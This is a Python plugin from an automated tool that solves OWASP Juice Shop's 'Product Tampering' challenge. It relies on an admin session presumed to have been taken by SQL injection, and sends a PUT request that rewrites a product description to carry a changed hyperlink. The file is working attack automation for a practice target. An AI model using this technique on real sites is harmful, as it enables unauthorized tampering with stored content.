# SOURCE FILE:    Product_Tampering.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Solve PRODUCT TAMPERING Challenge
#                 Change the description of a product with href so as to change hyperlink
#
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Yoyo Wang
#
# NOTES           You MUST need admin record
#--------------------------------------------------------------------------------------

import time
from plugins import attack as a
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class temper(a.attack_inter):

# --------------------------------------------------------------------------------------
# FUNCTION: __init__
# ARGUMENTS: N/A
# RETURNS: void
# Description: Initial class variables
# --------------------------------------------------------------------------------------
    def __init__(self):
        # REST session
        self.juice_session = a.requests.session()
        # description with new href
        self.description = "O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"
        # product ID with the description we intended to change
        self.productId = 9

#--------------------------------------------------------------------------------------
#FUNCTION generator
#ARGUMENTS: N/A
#RETURNS: json_data  --> will be embedded into POST request json field.
#Description: This function is used to generate needed data from REST requests
#
#NOTES:
#--------------------------------------------------------------------------------------
    def generator(self):
        json = {
            'description': self.description
        }
        try:
            self.cookie, self.header = a.get_auth("admin")
        except:
            print("you do not have a record of admin, please try SQL injection first")
        return json

#--------------------------------------------------------------------------------------
#FUNCTION temper_description
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This function is used to temper the product's description
#
#NOTES:
#--------------------------------------------------------------------------------------
    def temper_description(self):
        print("------------------------------------------")
        print("Let us temper the product's description --------------")
        url = a.URL + '/api/products/{}'.format(self.productId)
        json_data = self.generator()
        response = self.juice_session.put(url, cookies=self.cookie, headers=self.header, json=json_data)
        print(response.text)

# --------------------------------------------------------------------------------------
# FUNCTION run
# ARGUMENTS: N/A
# RETURNS: N/A
# Description: This is the main function for plugin to send REST requests.
#
# NOTES: None
# --------------------------------------------------------------------------------------
    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log',
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        a.logging.info('#Product Tampering Started')
        self.temper_description()
        a.logging.info('#Product Tampering Finished')




